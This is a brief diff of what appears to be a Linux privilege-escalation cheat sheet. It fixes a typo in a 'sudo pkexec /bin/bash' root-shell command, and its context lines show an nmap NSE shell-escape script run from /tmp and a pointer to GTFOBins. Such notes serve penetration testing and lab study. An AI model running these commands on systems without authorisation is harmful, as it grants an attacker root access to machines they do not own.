@@ -45,7 +45,7 @@ chmod +x /tmp/escape.nse
 nmap --script=/tmp/escape.nse
 
 using GTFOBins					-find vulnerable binaries listed in this database based on target device
-sudo pxexec /bin/bash
+sudo pkexec /bin/bash
 
 ----------
 Vuln CAPABILITIES
